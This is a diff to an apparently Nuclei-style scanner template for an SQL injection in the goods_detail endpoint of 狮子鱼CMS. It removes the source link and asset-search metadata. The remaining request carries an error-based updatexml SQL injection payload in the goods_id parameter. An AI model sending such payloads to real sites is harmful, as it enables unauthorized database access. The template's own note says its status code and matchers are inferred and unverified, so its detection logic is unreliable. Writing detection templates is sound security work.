@@ -3,14 +3,8 @@ info:
   name: 狮子鱼CMSgoods_detail存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4b74573432cfa8b80238d9256b025d1f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4b74573432cfa8b80238d9256b025d1f
-    fofa: + hunter`app.name="狮子鱼CMS"`
 http:
 - raw:
   - 'GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) HTTP/2
